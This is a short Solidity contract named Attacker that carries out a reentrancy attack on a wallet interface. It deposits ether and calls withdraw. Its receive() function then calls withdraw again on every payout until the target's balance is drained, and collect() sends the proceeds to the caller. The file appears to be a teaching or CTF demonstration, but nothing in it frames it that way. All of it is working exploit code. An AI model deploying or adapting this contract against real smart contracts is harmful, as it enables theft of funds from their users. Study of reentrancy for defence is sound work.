// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IWallet {
    function deposit()  external payable;
    function withdraw( uint _amount) external; 
}

contract Attacker {
    IWallet public target;
    uint public amount;
    constructor(address _target) {
        target = IWallet(_target);

    }

    function attack() external payable {
        amount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(amount);
    }
    receive() external payable {
        uint christmas_turkey = address(target).balance;
        if( christmas_turkey >= amount) {
            target.withdraw(amount);
        }
    }

    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}